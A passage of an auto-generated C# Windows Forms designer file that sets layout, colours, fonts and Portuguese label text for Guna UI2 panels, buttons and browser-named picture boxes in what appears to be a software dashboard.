            this.Guna_Firefox.TabStop = false;
            this.Guna_Firefox.UseTransparentBackground = true;
            this.Guna_Firefox.Visible = false;
            // 
            // Guna_Brave
            // 
            this.Guna_Brave.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.Guna_Brave.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna_Brave, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna_Brave, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna_Brave.Image = ((System.Drawing.Image)(resources.GetObject("Guna_Brave.Image")));
            this.Guna_Brave.ImageRotate = 0F;
            this.Guna_Brave.Location = new System.Drawing.Point(52, 50);
            this.Guna_Brave.Name = "Guna_Brave";
            this.Guna_Brave.Size = new System.Drawing.Size(629, 361);
            this.Guna_Brave.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.Guna_Brave.TabIndex = 164;
            this.Guna_Brave.TabStop = false;
            this.Guna_Brave.Visible = false;
            // 
            // Guna_Opera
            // 
            this.Guna_Opera.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.Guna_Opera.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna_Opera, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna_Opera, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna_Opera.Image = ((System.Drawing.Image)(resources.GetObject("Guna_Opera.Image")));
            this.Guna_Opera.ImageRotate = 0F;
            this.Guna_Opera.Location = new System.Drawing.Point(52, 50);
            this.Guna_Opera.Name = "Guna_Opera";
            this.Guna_Opera.Size = new System.Drawing.Size(629, 361);
            this.Guna_Opera.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.Guna_Opera.TabIndex = 166;
            this.Guna_Opera.TabStop = false;
            this.Guna_Opera.Visible = false;
            // 
            // Painel_Right
            // 
            this.Painel_Right.BorderRadius = 10;
            this.Painel_Right.BorderThickness = 1;
            this.Painel_Right.Controls.Add(this.Guna2HtmlLabel53);
            this.Painel_Right.Controls.Add(this.Guna2Button5);
            this.Painel_Right.Controls.Add(this.Guna2PictureBox40);
            this.Painel_Right.Controls.Add(this.Guna2Button6);
            this.Painel_Right.Controls.Add(this.Guna2PictureBox70);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel13);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel14);
            this.Painel_Right.Controls.Add(this.guna2PictureBox6);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel15);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel16);
            this.Painel_Right.Controls.Add(this.Guna2PictureBox29);
            this.Painel_Right.Controls.Add(this.guna2PictureBox7);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel17);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel18);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel19);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel20);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel21);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel22);
            this.Painel_Right.Controls.Add(this.guna2PictureBox8);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel23);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel24);
            this.Painel_Right.Controls.Add(this.guna2PictureBox9);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel25);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel26);
            this.Painel_Right.Controls.Add(this.guna2PictureBox10);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel27);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel28);
            this.Painel_Right.Controls.Add(this.guna2PictureBox11);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel29);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel30);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel31);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel32);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel33);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel34);
            this.Painel_Right.Controls.Add(this.guna2PictureBox12);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel35);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel36);
            this.Painel_Right.Controls.Add(this.guna2PictureBox13);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel1);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel2);
            this.Painel_Right.Controls.Add(this.guna2PictureBox2);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel3);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel4);
            this.Painel_Right.Controls.Add(this.guna2PictureBox3);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel5);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel6);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel7);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel8);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel9);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel10);
            this.Painel_Right.Controls.Add(this.guna2PictureBox4);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel11);
            this.Painel_Right.Controls.Add(this.guna2HtmlLabel12);
            this.Painel_Right.Controls.Add(this.guna2PictureBox5);
            this.Painel_Right.Controls.Add(this.Guna2HtmlLabel87);
            this.Painel_Right.Controls.Add(this.Guna2HtmlLabel59);
            this.Painel_Right.Controls.Add(this.Guna2HtmlLabel86);
            this.Painel_Right.Controls.Add(this.Guna2PictureBox35);
            this.Painel_Right.Controls.Add(this.Android11_Red);
            this.Painel_Right.Controls.Add(this.Android12_Red);
            this.Painel_Right.Controls.Add(this.Guna2PictureBox41);
            this.Painel_Right.Controls.Add(this.Guna2HtmlLabel83);
            this.Painel_Right.Controls.Add(this.Guna2HtmlLabel72);
            this.Painel_Right.Controls.Add(this.Guna2HtmlLabel66);
            this.Painel_Right.Controls.Add(this.Android12_Green);
            this.Painel_Right.Controls.Add(this.Android11_Green);
            this.Painel_Right.Controls.Add(this.Guna2HtmlLabel81);
            this.Painel_Right.Controls.Add(this.Guna2PictureBox36);
            this.Painel_Right.Controls.Add(this.Guna2HtmlLabel73);
            this.Painel_Right.Controls.Add(this.Guna2HtmlLabel67);
            this.Painel_Right.Controls.Add(this.Guna2PictureBox42);
            this.Guna2Transition1.SetDecoration(this.Painel_Right, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Painel_Right, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Painel_Right.Dock = System.Windows.Forms.DockStyle.Right;
            this.Painel_Right.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Painel_Right.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Painel_Right.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.Painel_Right.Location = new System.Drawing.Point(732, 0);
            this.Painel_Right.Name = "Painel_Right";
            this.Painel_Right.Size = new System.Drawing.Size(352, 738);
            this.Painel_Right.TabIndex = 143;
            // 
            // Guna2HtmlLabel53
            // 
            this.Guna2HtmlLabel53.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel53, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel53, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel53.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel53.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel53.Location = new System.Drawing.Point(93, 655);
            this.Guna2HtmlLabel53.Name = "Guna2HtmlLabel53";
            this.Guna2HtmlLabel53.Size = new System.Drawing.Size(167, 15);
            this.Guna2HtmlLabel53.TabIndex = 145;
            this.Guna2HtmlLabel53.Text = "https://andromedasoftware.com.br";
            // 
            // Guna2Button5
            // 
            this.Guna2Button5.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Button5.BorderColor = System.Drawing.Color.Transparent;
            this.Guna2Button5.BorderRadius = 6;
            this.Guna2Button5.BorderThickness = 1;
            this.Guna2Transition1.SetDecoration(this.Guna2Button5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2Button5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Button5.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2Button5.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2Button5.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2Button5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2Button5.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2Button5.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2Button5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(156)))), ((int)(((byte)(176)))));
            this.Guna2Button5.Image = ((System.Drawing.Image)(resources.GetObject("Guna2Button5.Image")));
            this.Guna2Button5.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2Button5.Location = new System.Drawing.Point(4, 691);
            this.Guna2Button5.Name = "Guna2Button5";
            this.Guna2Button5.ShadowDecoration.Color = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.Guna2Button5.ShadowDecoration.Enabled = true;
            this.Guna2Button5.ShadowDecoration.Shadow = new System.Windows.Forms.Padding(2, 1, 2, 5);
            this.Guna2Button5.Size = new System.Drawing.Size(163, 37);
            this.Guna2Button5.TabIndex = 145;
            this.Guna2Button5.Text = "Duvidas frequentes";
            this.Guna2Button5.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            // 
            // Guna2PictureBox40
            // 
            this.Guna2PictureBox40.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox40, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox40, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox40.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox40.Image")));
            this.Guna2PictureBox40.ImageRotate = 0F;
            this.Guna2PictureBox40.Location = new System.Drawing.Point(222, 13);
            this.Guna2PictureBox40.Name = "Guna2PictureBox40";
            this.Guna2PictureBox40.Size = new System.Drawing.Size(25, 25);
            this.Guna2PictureBox40.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox40.TabIndex = 102;
            this.Guna2PictureBox40.TabStop = false;
            this.Guna2PictureBox40.UseTransparentBackground = true;
            // 
            // Guna2Button6
            // 
            this.Guna2Button6.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Button6.BorderColor = System.Drawing.Color.Transparent;
            this.Guna2Button6.BorderRadius = 6;
            this.Guna2Button6.BorderThickness = 1;
            this.Guna2Transition1.SetDecoration(this.Guna2Button6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2Button6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Button6.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2Button6.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2Button6.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2Button6.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2Button6.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2Button6.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2Button6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(156)))), ((int)(((byte)(176)))));
            this.Guna2Button6.Image = ((System.Drawing.Image)(resources.GetObject("Guna2Button6.Image")));
            this.Guna2Button6.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2Button6.Location = new System.Drawing.Point(176, 691);
            this.Guna2Button6.Name = "Guna2Button6";
            this.Guna2Button6.ShadowDecoration.Color = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.Guna2Button6.ShadowDecoration.Enabled = true;
            this.Guna2Button6.ShadowDecoration.Shadow = new System.Windows.Forms.Padding(2, 1, 2, 5);
            this.Guna2Button6.Size = new System.Drawing.Size(172, 37);
            this.Guna2Button6.TabIndex = 144;
            this.Guna2Button6.Text = "Gostaria de ler os termos";
            this.Guna2Button6.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            // 
            // Guna2PictureBox70
            // 
            this.Guna2PictureBox70.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox70, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox70, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox70.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox70.Image")));
            this.Guna2PictureBox70.ImageRotate = 0F;
            this.Guna2PictureBox70.Location = new System.Drawing.Point(101, 501);
            this.Guna2PictureBox70.Name = "Guna2PictureBox70";
            this.Guna2PictureBox70.Size = new System.Drawing.Size(150, 150);
            this.Guna2PictureBox70.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.Guna2PictureBox70.TabIndex = 144;
            this.Guna2PictureBox70.TabStop = false;
            this.Guna2PictureBox70.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel13
            // 
            this.guna2HtmlLabel13.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel13, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel13, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel13.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel13.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel13.Location = new System.Drawing.Point(54, 470);
            this.guna2HtmlLabel13.Name = "guna2HtmlLabel13";
            this.guna2HtmlLabel13.Size = new System.Drawing.Size(32, 15);
            this.guna2HtmlLabel13.TabIndex = 158;
            this.guna2HtmlLabel13.Text = "Baixo";
            // 
            // guna2HtmlLabel14
            // 
            this.guna2HtmlLabel14.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel14, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel14, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel14.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel14.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel14.Location = new System.Drawing.Point(232, 470);
            this.guna2HtmlLabel14.Name = "guna2HtmlLabel14";
            this.guna2HtmlLabel14.Size = new System.Drawing.Size(32, 15);
            this.guna2HtmlLabel14.TabIndex = 156;
            this.guna2HtmlLabel14.Text = "Baixo";
            // 
            // guna2PictureBox6
            // 
            this.guna2PictureBox6.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox6.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox6.Image")));
            this.guna2PictureBox6.ImageRotate = 0F;
            this.guna2PictureBox6.Location = new System.Drawing.Point(18, 395);
            this.guna2PictureBox6.Name = "guna2PictureBox6";
            this.guna2PictureBox6.Size = new System.Drawing.Size(25, 25);
            this.guna2PictureBox6.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox6.TabIndex = 144;
            this.guna2PictureBox6.TabStop = false;
            this.guna2PictureBox6.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel15
            // 
            this.guna2HtmlLabel15.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel15, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel15, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel15.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel15.ForeColor = System.Drawing.Color.Red;
            this.guna2HtmlLabel15.Location = new System.Drawing.Point(26, 468);
            this.guna2HtmlLabel15.Name = "guna2HtmlLabel15";
            this.guna2HtmlLabel15.Size = new System.Drawing.Size(17, 17);
            this.guna2HtmlLabel15.TabIndex = 157;
            this.guna2HtmlLabel15.Text = "+0";
            // 
            // guna2HtmlLabel16
            // 
            this.guna2HtmlLabel16.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel16, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel16, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel16.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel16.ForeColor = System.Drawing.Color.Red;
            this.guna2HtmlLabel16.Location = new System.Drawing.Point(205, 468);
            this.guna2HtmlLabel16.Name = "guna2HtmlLabel16";
            this.guna2HtmlLabel16.Size = new System.Drawing.Size(17, 17);
            this.guna2HtmlLabel16.TabIndex = 143;
            this.guna2HtmlLabel16.Text = "+3";
            // 
            // Guna2PictureBox29
            // 
            this.Guna2PictureBox29.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox29, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox29, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox29.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox29.Image")));
            this.Guna2PictureBox29.ImageRotate = 0F;
            this.Guna2PictureBox29.Location = new System.Drawing.Point(305, 12);
            this.Guna2PictureBox29.Name = "Guna2PictureBox29";
            this.Guna2PictureBox29.Size = new System.Drawing.Size(30, 30);
            this.Guna2PictureBox29.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox29.TabIndex = 19;
            this.Guna2PictureBox29.TabStop = false;
            this.Guna2PictureBox29.UseTransparentBackground = true;
            // 
            // guna2PictureBox7
            // 
            this.guna2PictureBox7.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox7.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox7.Image")));
            this.guna2PictureBox7.ImageRotate = 0F;
            this.guna2PictureBox7.Location = new System.Drawing.Point(23, 430);
            this.guna2PictureBox7.Name = "guna2PictureBox7";
            this.guna2PictureBox7.Size = new System.Drawing.Size(20, 20);
            this.guna2PictureBox7.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox7.TabIndex = 148;
            this.guna2PictureBox7.TabStop = false;
            this.guna2PictureBox7.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel17
            // 
            this.guna2HtmlLabel17.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel17, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel17, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel17.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel17.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel17.Location = new System.Drawing.Point(231, 453);
            this.guna2HtmlLabel17.Name = "guna2HtmlLabel17";
            this.guna2HtmlLabel17.Size = new System.Drawing.Size(45, 15);
            this.guna2HtmlLabel17.TabIndex = 155;
            this.guna2HtmlLabel17.Text = "Maximo";
            // 
            // guna2HtmlLabel18
            // 
            this.guna2HtmlLabel18.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel18, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel18, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel18.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel18.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel18.Location = new System.Drawing.Point(49, 435);
            this.guna2HtmlLabel18.Name = "guna2HtmlLabel18";
            this.guna2HtmlLabel18.Size = new System.Drawing.Size(75, 15);
            this.guna2HtmlLabel18.TabIndex = 149;
            this.guna2HtmlLabel18.Text = "Ultimo tempo";
            // 
            // guna2HtmlLabel19
            // 
            this.guna2HtmlLabel19.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel19, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel19, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel19.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel19.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel19.Location = new System.Drawing.Point(49, 401);
            this.guna2HtmlLabel19.Name = "guna2HtmlLabel19";
            this.guna2HtmlLabel19.Size = new System.Drawing.Size(131, 19);
            this.guna2HtmlLabel19.TabIndex = 145;
            this.guna2HtmlLabel19.Text = "Windows Server 2012";
            // 
            // guna2HtmlLabel20
            // 
            this.guna2HtmlLabel20.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel20, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel20, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel20.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel20.ForeColor = System.Drawing.Color.Green;
            this.guna2HtmlLabel20.Location = new System.Drawing.Point(202, 451);
            this.guna2HtmlLabel20.Name = "guna2HtmlLabel20";
            this.guna2HtmlLabel20.Size = new System.Drawing.Size(17, 17);
            this.guna2HtmlLabel20.TabIndex = 154;
            this.guna2HtmlLabel20.Text = "+9";
            // 
            // guna2HtmlLabel21
            // 
            this.guna2HtmlLabel21.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel21, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel21, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel21.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel21.ForeColor = System.Drawing.Color.Green;
            this.guna2HtmlLabel21.Location = new System.Drawing.Point(19, 451);
            this.guna2HtmlLabel21.Name = "guna2HtmlLabel21";
            this.guna2HtmlLabel21.Size = new System.Drawing.Size(24, 17);
            this.guna2HtmlLabel21.TabIndex = 152;
            this.guna2HtmlLabel21.Text = "+12";
            // 
            // guna2HtmlLabel22
            // 
            this.guna2HtmlLabel22.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel22, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel22, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel22.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel22.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel22.Location = new System.Drawing.Point(51, 453);
            this.guna2HtmlLabel22.Name = "guna2HtmlLabel22";
            this.guna2HtmlLabel22.Size = new System.Drawing.Size(45, 15);
            this.guna2HtmlLabel22.TabIndex = 153;
            this.guna2HtmlLabel22.Text = "Maximo";
            // 
            // guna2PictureBox8
            // 
            this.guna2PictureBox8.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox8.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox8.Image")));
            this.guna2PictureBox8.ImageRotate = 0F;
            this.guna2PictureBox8.Location = new System.Drawing.Point(202, 395);
            this.guna2PictureBox8.Name = "guna2PictureBox8";
            this.guna2PictureBox8.Size = new System.Drawing.Size(25, 25);
            this.guna2PictureBox8.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox8.TabIndex = 146;
            this.guna2PictureBox8.TabStop = false;
            this.guna2PictureBox8.UseTransparentBackground = true;
            // 
            // guna2HtmlLabel23
            // 
            this.guna2HtmlLabel23.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel23, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel23, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel23.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel23.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel23.Location = new System.Drawing.Point(228, 435);
            this.guna2HtmlLabel23.Name = "guna2HtmlLabel23";
            this.guna2HtmlLabel23.Size = new System.Drawing.Size(75, 15);
            this.guna2HtmlLabel23.TabIndex = 151;
            this.guna2HtmlLabel23.Text = "Ultimo tempo";
            // 
            // guna2HtmlLabel24
            // 
            this.guna2HtmlLabel24.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.guna2HtmlLabel24, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2HtmlLabel24, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2HtmlLabel24.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel24.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel24.Location = new System.Drawing.Point(233, 401);
